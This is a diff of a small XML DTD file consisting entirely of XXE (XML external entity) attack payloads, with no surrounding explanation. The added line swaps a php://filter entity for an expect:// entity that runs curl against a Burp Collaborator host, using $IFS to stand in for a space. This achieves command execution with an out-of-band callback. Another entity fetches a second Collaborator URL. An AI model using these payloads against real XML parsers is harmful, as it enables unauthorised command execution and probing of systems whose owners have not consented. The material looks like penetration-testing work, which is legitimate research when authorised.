@@ -1,4 +1,4 @@
-<!ENTITY % ccc SYSTEM "php://filter/convert.bae64-encode/resource=https://hhh.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net">
+<!ENTITY % ccc SYSTEM "expect://curl$IFS'hhhhh.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net'">
 %ccc;
 <!ENTITY % ddd SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net/">
 %ddd;
